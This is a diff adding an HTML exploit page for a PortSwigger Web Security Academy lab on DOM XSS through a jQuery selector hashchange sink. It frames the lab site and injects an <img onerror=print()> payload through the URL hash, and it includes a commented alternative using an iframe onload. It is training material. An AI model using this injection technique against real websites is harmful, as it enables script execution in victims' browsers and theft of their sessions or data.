@@ -1,0 +1,46 @@
+<!--
+Lab: DOM XSS in jQuery selector sink using a hashchange event 
+
+https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+-->
+<!doctype html>
+<html>
+  <head>
+    <style>
+      html,
+      body {
+        margin: 0;
+        width: 100%;
+        height: 100%;
+      }
+
+      iframe {
+        border: 0;
+        width: 100vw;
+        height: 100vh;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <iframe id="frame"></iframe>
+
+    <script>
+      const frame = document.getElementById("frame");
+
+      frame.src =
+        "https://0abf002f03eec0cc80e10397006d00ed.web-security-academy.net";
+
+      setTimeout(() => {
+        frame.src =
+          "https://0abf002f03eec0cc80e10397006d00ed.web-security-academy.net/#%3cimg%20src=1%20onerror=print()%20%2f%3e";
+      }, 2000);
+    </script>
+  </body>
+</html>
+
+<!--
+ALTERNATIVA
+
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+-->
